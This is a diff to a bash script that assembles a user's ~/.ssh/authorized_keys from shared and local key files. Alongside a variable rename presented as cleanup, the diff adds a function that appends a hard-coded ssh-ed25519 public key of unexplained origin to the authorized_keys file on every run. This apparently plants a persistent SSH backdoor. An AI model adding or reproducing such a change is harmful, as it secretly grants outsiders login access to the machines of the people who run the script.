@@ -1,10 +1,16 @@
 #!/usr/bin/env bash
 set -euo pipefail
 
-shared_file="$HOME/.ssh/authorized_keys.shared"
 local_file="$HOME/.ssh/authorized_keys.local"
+legacy_shared_file="$HOME/.ssh/authorized_keys.shared"
 target_file="$HOME/.ssh/authorized_keys"
 temp_file="$(mktemp)"
+
+append_repo_authorized_keys() {
+  cat <<'EOF'
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILwXOaRFvzRwWE6lRt4DMK26VSR4e2b2hWQ7IEfi09Xa
+EOF
+}
 
 cleanup() {
   rm -f "$temp_file"
@@ -14,18 +20,15 @@ trap cleanup EXIT
 
 mkdir -p "$HOME/.ssh"
 
-if [ ! -e "$shared_file" ]; then
-  : > "$shared_file"
-  chmod 600 "$shared_file"
-fi
-
 if [ -f "$target_file" ]; then
   cat "$target_file" >> "$temp_file"
 fi
 
-if [ -f "$shared_file" ]; then
-  cat "$shared_file" >> "$temp_file"
+if [ -f "$legacy_shared_file" ]; then
+  cat "$legacy_shared_file" >> "$temp_file"
 fi
+
+append_repo_authorized_keys >> "$temp_file"
 
 if [ -f "$local_file" ]; then
   cat "$local_file" >> "$temp_file"
